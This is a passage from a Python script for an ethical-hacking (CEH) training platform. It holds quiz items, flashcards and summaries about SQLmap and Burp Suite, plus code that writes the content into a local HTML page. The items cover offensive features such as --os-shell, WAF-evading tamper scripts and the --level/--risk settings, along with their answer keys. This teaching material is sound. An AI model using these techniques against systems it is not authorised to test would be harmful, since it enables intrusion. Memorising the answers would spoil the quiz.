                'fb': 'The \'-r\' flag allows SQLmap to parse a saved HTTP request, which is extremely useful for testing POST requests and authenticated sessions.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'Which SQLmap parameters increase the thoroughness of the scan but also the likelihood of causing issues?',
                'opts': ['--batch and --answers', '--dbs and --tables', '--level and --risk', '--proxy and --tor'],
                'correct': 2,
                'fb': 'Increasing --level and --risk instructs SQLmap to use more payloads and test more vectors (like headers), but it increases traffic and the chance of updating/deleting data.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Intermediate',
                'q': 'Automated tools like SQLmap can always bypass Web Application Firewalls (WAF) out of the box.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'WAFs often block standard SQLmap payloads. Testers must often use tamper scripts (--tamper) to obfuscate payloads and bypass filters.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'What does the SQLmap flag --os-shell attempt to achieve?',
                'opts': ['Identify the operating system', 'Drop an interactive command prompt on the database server', 'Download the /etc/shadow file', 'Bypass the OS firewall'],
                'correct': 1,
                'fb': '--os-shell attempts to upload a web stager or use database features like xp_cmdshell to provide the attacker with an interactive command shell.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Why is it important to use Burp Suite in conjunction with SQLmap?',
                'opts': ['Burp Suite is faster than SQLmap.', 'Burp Suite handles complex authentication and session management better.', 'SQLmap cannot run on Windows.', 'Burp Suite is required to start SQLmap.'],
                'correct': 1,
                'fb': 'Burp Suite allows the tester to authenticate manually and save the exact request with valid cookies, which SQLmap can then use.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Beginner',
                'q': 'It is safe and legal to run SQLmap against any website on the internet.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'Running automated exploitation tools against unauthorized targets is illegal and unethical.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which tool feature is best for modifying parameters on the fly before they reach the server?',
                'opts': ['SQLmap --dump', 'Burp Suite Proxy Intercept', 'Nmap Scripting Engine', 'Wireshark packet capture'],
                'correct': 1,
                'fb': 'Burp Suite\'s Proxy Intercept feature halts requests from the browser, allowing the tester to modify them before forwarding.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Advanced',
                'q': 'If a target application heavily filters spaces in input, what SQLmap feature can help?',
                'opts': ['--space-bypass', '--tamper scripts (e.g., space2comment)', '--level 5', '--force-ssl'],
                'correct': 1,
                'fb': 'SQLmap includes tamper scripts that modify payloads to evade filters, such as replacing spaces with SQL comments (/**/).'
            }
        ],
        'flashcards': [
            { 'f': 'SQLmap', 'b': 'An open-source penetration testing tool that automates detecting and exploiting SQLi flaws.' },
            { 'f': 'Interception Proxy', 'b': 'A tool like Burp Suite that sits between the client and server to inspect and modify traffic.' }
        ],
        'summary': [
            'Burp Suite is essential for manual testing and request capture.',
            'SQLmap automates the discovery and exploitation of SQLi.',
            'Combining both tools yields the most effective results.',
            'Parameters like --level and --risk control SQLmap\'s aggressiveness.',
            'Always have authorization before running automated exploitation tools.'
        ],
        'outcomes': [
            'Configure and use Burp Suite to capture requests.',
            'Utilize SQLmap to automate SQLi exploitation.',
            'Understand the risks of running automated tools in production.'
        ],
        'meta': {
            'contentVersion': '1.0.0',
            'estimatedTime': 60,
            'difficulty': 'Intermediate',
            'prerequisites': ['SQLi Methodology'],
            'lastReviewed': '2026-07-18'
        }
    }
}

target_file = r"C:\Users\navee\OneDrive\Desktop\Greatcoder\CEHv13\ceh-platform\frontend\index.html"

try:
    with open(target_file, 'r', encoding='utf-8') as f:
        content = f.read()

    injection_marker = "// ── TAB WIRING ──"
    
    if injection_marker in content:
        # Build the javascript payload
        js_payload = ""
        for topic_id, topic_data in topics.items():
            # Convert dictionary to javascript object assignment
            js_payload += f"CONTENT['{topic_id}'] = {json.dumps(topic_data, indent=2)};\n\n"
        
        new_content = content.replace(injection_marker, js_payload + injection_marker)
        
        with open(target_file, 'w', encoding='utf-8') as f:
            f.write(new_content)
        print("Successfully injected content into index.html")
    else:
        print(f"Injection marker '{injection_marker}' not found in index.html")
except Exception as e:
    print(f"Error processing index.html: {str(e)}")
